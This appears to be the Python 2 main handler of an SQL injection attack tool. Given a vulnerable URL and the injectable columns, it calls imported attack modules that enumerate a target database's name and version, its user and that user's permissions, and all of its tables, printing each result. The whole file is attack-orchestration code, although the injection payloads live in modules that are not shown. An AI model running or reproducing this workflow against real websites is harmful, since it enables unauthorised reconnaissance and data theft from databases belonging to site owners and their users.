from src.Colors import TextColor
from .AttackCommands.getDatabaseInfo import databaseInfo
from .AttackCommands.getUserDatabase import userInfos
from .AttackCommands.getTables import getTables


def mainHandler(exploitTools):
    if exploitTools['vulnColumns'] is not None and exploitTools['urlFace'] is not None:
        # step 1 => Get database version and name

        print TextColor.WARNING + "[!] Please wait for enumerate the database information"

        dataBaseInfo = databaseInfo(
            url=exploitTools['urlFace'],
            vulnerableColumns=exploitTools['vulnColumns']
        )

        databaseName = dataBaseInfo['database-name']
        datbaseVersion = dataBaseInfo['database-version']

        print TextColor.GREEN + "\t[+] database name: " + databaseName[0] + TextColor.WHITE
        print TextColor.GREEN + "\t[+] database version: " + datbaseVersion[0] + TextColor.WHITE

        # step 2 => Get user of database

        print TextColor.WARNING + "[!] Please wait for getting information from user"

        userInfo = userInfos(
            url=exploitTools['urlFace'],
            vulnerableColumns=exploitTools['vulnColumns']
        )

        userName = userInfo['user-username']
        userPermission = userInfo['user-permission']

        print TextColor.GREEN + "\t[+] username of database: " + userName[0] + TextColor.WHITE
        print TextColor.GREEN + "\t[+] user permission: " + userPermission[0] + TextColor.WHITE

        # step 3 => get all table that exist in database
        getTables(
            url=exploitTools['urlFace'],
            vulnerableColumns=exploitTools['vulnColumns']
        )
